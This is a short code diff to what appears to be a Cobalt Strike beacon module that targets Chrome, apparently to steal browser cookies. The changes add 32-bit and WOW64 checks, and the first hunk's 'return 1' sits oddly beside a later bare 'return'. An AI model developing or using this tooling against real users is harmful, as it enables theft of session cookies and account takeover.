@@ -57,6 +57,11 @@ extern "C" {
         banner();
         BeaconPrintf(CALLBACK_OUTPUT, "Kittens love cookies too! >:3\n");
 
+#ifndef _WIN64
+        BeaconPrintf(CALLBACK_OUTPUT, "32bit version is not currently supported.\n");
+        return 1;
+#endif // !_WIN64
+
         DWORD chromePid = 0;
         LPCSTR targetConfig = NULL;
         datap parser;
@@ -125,6 +130,12 @@ extern "C" {
                 return;
             }
             BeaconPrintf(CALLBACK_OUTPUT, "Targeting PID: %d\n", chromePid);
+        }
+
+        if (IsWow64(hChrome))
+        {
+            BeaconPrintf(CALLBACK_ERROR, "Target process is 32bit. Only 64bit browsers are supported!\n");
+            return;
         }
 
         uintptr_t baseAddress = 0;
